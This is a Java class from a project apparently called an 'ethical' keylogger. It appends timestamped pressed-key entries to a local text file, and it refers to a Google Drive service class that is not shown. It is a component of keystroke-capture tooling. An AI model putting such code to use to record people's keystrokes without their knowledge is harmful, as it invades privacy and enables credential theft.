package com.mycompany.ethicaljavalogger.services;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyboardLogService {
    private static final String FILE_PATH = "keyboard_logs.txt";
    
    public KeyboardLogService() {
        this.writeHeader();
    }
    
    public void writeInputLog(String input) {
        String dateTimeText = this.getCurrentDateTimeText();
        this.writeInFile(dateTimeText + "     " + input);
    }
    
    private void writeHeader() {
        File keyboardLogFile = new File(FILE_PATH);
        
        if (!keyboardLogFile.exists()) {
            this.writeInFile("Data e Hora             Tecla Pressionada");
            this.writeInFile("-------------------     -------------------");
        }
    }
    
    private void writeInFile(String textLine) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(FILE_PATH, true))) {
            writer.write(textLine + "\n");
        } catch (IOException ex) {
            Logger.getLogger(GoogleDriveService.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    private String getCurrentDateTimeText() {
        LocalDateTime currentDateTime = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm:ss");
        return currentDateTime.format(formatter);
    }
    
    public static String getFilePath() {
        return FILE_PATH;
    }
}
